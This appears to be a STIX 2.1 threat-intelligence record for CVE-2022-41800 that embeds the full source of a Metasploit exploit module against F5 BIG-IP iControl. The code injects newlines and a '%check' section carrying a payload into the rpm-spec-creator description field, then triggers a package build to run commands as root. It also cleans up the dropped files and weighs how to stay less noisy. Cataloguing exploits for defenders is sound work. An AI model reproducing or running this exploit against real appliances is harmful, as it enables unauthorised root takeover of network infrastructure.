{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--29751bc6-eca0-4ac4-8329-686765318646",
    "created": "2024-08-14T17:00:11.906244Z",
    "modified": "2024-08-14T17:00:11.906247Z",
    "name": "F5 BIG-IP iControl Authenticated RCE via RPM Creator",
    "description": " This module exploits a newline injection into an RPM .rpmspec file that permits authenticated users to remotely execute commands.  Successful exploitation results in remote code execution as the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800.rb",
            "external_id": "f5_icontrol_rpmspec_rce_cve_2022_41800.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-41800"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K97843387"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K13325942"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP iControl Authenticated RCE via RPM Creator',\n        'Description' => %q{\n          This module exploits a newline injection into an RPM .rpmspec file\n          that permits authenticated users to remotely execute commands.\n\n          Successful exploitation results in remote code execution\n          as the root user.\n        },\n        'Author' => [\n          'Ron Bowes' # Discovery, PoC, and module\n        ],\n        'References' => [\n          ['CVE', '2022-41800'],\n          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],\n          ['URL', 'https://support.f5.com/csp/article/K97843387'],\n          ['URL', 'https://support.f5.com/csp/article/K13325942'],\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2022-11-16', # Vendor advisory\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => true,\n        'Targets' => [\n          [ 'Default', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'PrependFork' => true, # Needed to avoid warnings about timeouts and potential failures across attempts.\n          'MeterpreterTryToFork' => true # Needed to avoid warnings about timeouts and potential failures across attempts.\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION], # One at a time\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ARTIFACTS_ON_DISK\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [true, 'iControl username', 'admin']),\n        OptString.new('HttpPassword', [true, 'iControl password', ''])\n      ]\n    )\n  end\n\n  def exploit\n    # The RPM name is based on these, so we need these to delete the RPM file after\n    name = rand_text_alphanumeric(5..10)\n    version = \"#{rand_text_numeric(1)}.#{rand_text_numeric(1)}.#{rand_text_numeric(1)}\"\n    release = \"#{rand_text_numeric(1)}.#{rand_text_numeric(1)}.#{rand_text_numeric(1)}\"\n\n    vprint_status('Creating an .rpmspec file on the target...')\n    result = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mgmt/shared/iapp/rpm-spec-creator'),\n      'ctype' => 'application/json',\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'data' => {\n        'specFileData' => {\n          'name' => name,\n          'srcBasePath' => '/tmp',\n          'version' => version,\n          'release' => release,\n          # This is the injection - add newlines then a '%check' section\n          'description' => \"\\n\\n%check\\n#{payload.encoded}\\n\",\n          'summary' => rand_text_alphanumeric(5..10)\n        }\n      }.to_json\n    })\n\n    fail_with(Failure::Unknown, 'Failed to send HTTP request') unless result\n    fail_with(Failure::NoAccess, 'Authentication failed') if result.code == 401\n    fail_with(Failure::UnexpectedReply, \"Server returned an unexpected response: HTTP/#{result.code}\") if result.code != 200\n\n    json = result&.get_json_document\n    fail_with(Failure::UnexpectedReply, \"Server didn't return valid JSON\") unless json\n\n    file_path = json['specFilePath']\n    fail_with(Failure::UnexpectedReply, \"Server didn't return a specFilePath\") unless file_path\n    vprint_status(\"Created spec file: #{file_path}\")\n    register_file_for_cleanup(file_path)\n\n    # We can also use `exit 1` in the %check function to prevent this file\n    # from being created, rather than cleaning it up.. but that seems noisier?\n    # Neither option gets logged so /shrug\n    register_file_for_cleanup(\"/var/config/rest/node/tmp/RPMS/noarch/#{name}-#{version}-#{release}.noarch.rpm\")\n\n    vprint_status('Building the RPM to trigger the payload...')\n    result = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mgmt/shared/iapp/build-package'),\n      'ctype' => 'application/json',\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'data' => {\n        'state' => {},\n        'appName' => rand_text_alphanumeric(5..10),\n        'packageDirectory' => '/tmp',\n        'specFilePath' => file_path\n      }.to_json\n    })\n    fail_with(Failure::Unknown, 'Failed to send HTTP request') unless result\n    fail_with(Failure::NoAccess, 'Authentication failed') if result.code == 401\n    fail_with(Failure::UnexpectedReply, \"Server returned an unexpected response: HTTP/#{result.code}\") if result.code < 200 || result.code > 299\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-16, # Vendor advisory",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}